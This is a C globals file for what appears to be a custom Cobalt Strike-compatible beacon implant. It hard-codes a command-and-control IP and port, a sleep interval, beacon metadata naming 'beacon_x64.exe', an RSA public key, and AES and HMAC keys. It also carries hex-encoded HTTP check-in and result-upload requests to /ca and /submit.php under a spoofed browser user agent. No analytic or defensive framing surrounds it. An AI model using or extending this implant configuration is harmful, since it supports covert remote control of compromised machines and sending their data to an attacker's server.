#include"../include/config.h"
const int nPadding = RSA_PKCS1_PADDING;
char *szIpAddress = "192.168.127.128";
int nPort = 80;
int nSleepTime = 20000;
unsigned char abHexData[83] = {
    0x00, 0x00, 0xBE, 0xEF, 0x00, 0x00, 0x00, 0x4B, 0xB3, 0x83, 0x34, 0x8C, 0x9B, 0x8D, 0x78, 0x90,
    0x1D, 0x28, 0xA9, 0xFF, 0x1B, 0x5D, 0xEE, 0xDB, 0xE4, 0x04, 0xB5, 0x01, 0x01, 0xF5, 0x87, 0x9E,
    0x00, 0x00, 0x02, 0x90, 0x00, 0x00, 0x06, 0x06, 0x02, 0x23, 0xF0, 0x00, 0x00, 0x7F, 0xF8, 0xE7,
    0x0C, 0x4C, 0x90, 0xE7, 0x0C, 0x0B, 0x80, 0x83, 0x24, 0xA8, 0xC0, 0x55, 0x53, 0x45, 0x52, 0x09,
    0x75, 0x73, 0x65, 0x72, 0x09, 0x62, 0x65, 0x61, 0x63, 0x6F, 0x6E, 0x5F, 0x78, 0x36, 0x34, 0x2E,
    0x65, 0x78, 0x65};
unsigned char abPublicKey[] = "-----BEGIN PUBLIC KEY-----\n"
                            "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCosA9h7/0Rj1c/A4oowv0a+nQoKbYjw8bQ/cbr\n"
                            "0gJQelHDcla9VbmKWARKXBDylNcYf8sOn0Gqw3HKu2D14gABMHBbIzDeW3ZEvPs5FpDDtGopDr/o\n"
                            "k5cNQcSpsRy+TrOTtx8a7JeoClR2Gtimu4GPI5Dlxq4fA5fiI5CcXnUiHwIDAQAB\n"
                            "-----END PUBLIC KEY-----\n";
char abAesKey[] = {0xcd, 0xa1, 0xd1, 0xb4, 0xb6, 0x33, 0xa4, 0x9c, 0xdf, 0xc1, 0x88, 0xe0, 0x44, 0x21, 0x32, 0xf8};

char abCsFixedIV[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p'};
char abPeer0_0[] = {/* Packet 8 */
                  0x47, 0x45, 0x54, 0x20, 0x2f, 0x63, 0x61, 0x20,
                  0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31,
                  0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74,
                  0x3a, 0x20, 0x2a, 0x2f, 0x2a, 0x0d, 0x0a, 0x43,
                  0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x3a, 0x20,

                  0x49, 0x64, 0x56, 0x53, 0x50, 0x50, 0x47, 0x7a, 0x46,
                  0x36, 0x4b, 0x38, 0x4f, 0x58, 0x53, 0x43, 0x6b,
                  0x50, 0x61, 0x68, 0x51, 0x73, 0x2f, 0x46, 0x44,
                  0x48, 0x62, 0x77, 0x47, 0x4b, 0x2f, 0x59, 0x41,
                  0x67, 0x48, 0x6f, 0x37, 0x69, 0x30, 0x33, 0x37,
                  0x75, 0x32, 0x4d, 0x2f, 0x7a, 0x43, 0x4a, 0x63,
                  0x58, 0x59, 0x2f, 0x6a, 0x65, 0x42, 0x64, 0x6a,
                  0x64, 0x6c, 0x47, 0x7a, 0x56, 0x66, 0x2b, 0x6f,
                  0x34, 0x35, 0x79, 0x30, 0x65, 0x67, 0x53, 0x7a,
                  0x72, 0x63, 0x4f, 0x53, 0x59, 0x68, 0x6d, 0x4b,
                  0x50, 0x75, 0x50, 0x35, 0x7a, 0x51, 0x34, 0x51,
                  0x68, 0x31, 0x63, 0x4f, 0x76, 0x75, 0x36, 0x4b,
                  0x64, 0x63, 0x51, 0x4b, 0x68, 0x58, 0x46, 0x79,
                  0x6e, 0x2b, 0x78, 0x49, 0x70, 0x48, 0x6a, 0x68,
                  0x63, 0x6b, 0x6c, 0x55, 0x61, 0x77, 0x42, 0x36,
                  0x43, 0x4a, 0x53, 0x48, 0x71, 0x6f, 0x48, 0x36,
                  0x50, 0x4c, 0x4a, 0x75, 0x61, 0x41, 0x56, 0x76,
                  0x4d, 0x31, 0x74, 0x34, 0x6f, 0x33, 0x50, 0x6f,
                  0x70, 0x78, 0x67, 0x58, 0x45, 0x51, 0x72, 0x78,
                  0x58, 0x2b, 0x4b, 0x71, 0x34, 0x67, 0x6f, 0x43,
                  0x44, 0x37, 0x56, 0x6d, 0x64, 0x39, 0x77, 0x74,
                  0x61, 0x77, 0x3d,

                  0x0d, 0x0a, 0x55, 0x73, 0x65,
                  0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a,
                  0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61,
                  0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f,
                  0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65,
                  0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31,
                  0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e,
                  0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20,
                  0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x4f, 0x57,
                  0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64,
                  0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b,
                  0x20, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x3b, 0x20,
                  0x4d, 0x41, 0x4c, 0x43, 0x4a, 0x53, 0x29, 0x0d,
                  0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20,

                  0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x33,
                  0x36, 0x2e, 0x31, 0x32, 0x38,

                  0x0d, 0x0a, 0x43,
                  0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f,
                  0x6e, 0x3a, 0x20, 0x4b, 0x65, 0x65, 0x70, 0x2d,
                  0x41, 0x6c, 0x69, 0x76, 0x65, 0x0d, 0x0a, 0x43,
                  0x61, 0x63, 0x68, 0x65, 0x2d, 0x43, 0x6f, 0x6e,
                  0x74, 0x72, 0x6f, 0x6c, 0x3a, 0x20, 0x6e, 0x6f,
                  0x2d, 0x63, 0x61, 0x63, 0x68, 0x65, 0x0d, 0x0a,
                  0x0d, 0x0a};
char abPost0_0[] = {/* Packet 27 */
                  0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x73, 0x75,
                  0x62, 0x6d, 0x69, 0x74, 0x2e, 0x70, 0x68, 0x70,
                  0x3f, 0x69, 0x64, 0x3d,

                  0x31, 0x33, 0x33, 0x37, 0x38, 0x37, 0x34, 0x36, 0x38, 0x38,

                  0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d,
                  0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a,
                  0x20, 0x2a, 0x2f, 0x2a, 0x0d, 0x0a, 0x43, 0x6f,
                  0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79,
                  0x70, 0x65, 0x3a, 0x20, 0x61, 0x70, 0x70, 0x6c,
                  0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f,
                  0x6f, 0x63, 0x74, 0x65, 0x74, 0x2d, 0x73, 0x74,
                  0x72, 0x65, 0x61, 0x6d, 0x0d, 0x0a, 0x55, 0x73,
                  0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74,
                  0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c,
                  0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63,
                  0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c,
                  0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20,
                  0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69,
                  0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54,
                  0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x4f,
                  0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69,
                  0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30,
                  0x3b, 0x20, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x3b,
                  0x20, 0x4d, 0x41, 0x4c, 0x43, 0x4a, 0x53, 0x29,
                  0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20,
                  0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e,
                  0x33, 0x36, 0x2e, 0x31, 0x32, 0x38, 0x0d, 0x0a,
                  0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d,
                  0x4c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x3a, 0x20,

                  0x35, 0x32,

                  0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e,
                  0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20,
                  0x4b, 0x65, 0x65, 0x70, 0x2d, 0x41, 0x6c, 0x69,
                  0x76, 0x65, 0x0d, 0x0a, 0x43, 0x61, 0x63, 0x68,
                  0x65, 0x2d, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f,
                  0x6c, 0x3a, 0x20, 0x6e, 0x6f, 0x2d, 0x63, 0x61,
                  0x63, 0x68, 0x65, 0x0d, 0x0a, 0x0d, 0x0a};
unsigned char abSharedKey[] = {0xcd, 0xa1, 0xd1, 0xb4, 0xb6, 0x33, 0xa4, 0x9c, 0xdf, 0xc1, 0x88, 0xe0, 0x44, 0x21, 0x32, 0xf8};
unsigned char abHmacKey[] = {0x33, 0xaa, 0x42, 0xf8, 0x63, 0x97, 0x2a, 0x7b, 0x9c, 0xe9, 0xf9, 0x13, 0xa6, 0x5d, 0xb0, 0x9b};
unsigned char abIv[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p'};

// 其他全局变量
unsigned char *g_pPostData = NULL;
unsigned char *g_pRepPostData = NULL;
int g_nPostLen = 0;
int g_nReqPostLen = 0;
unsigned char g_abEncryptedStr[128] = {0};
char *g_szHttp = NULL;
int g_nHttpLen = 0;
char g_szSessionId[20] = {0};
int nCount = 0;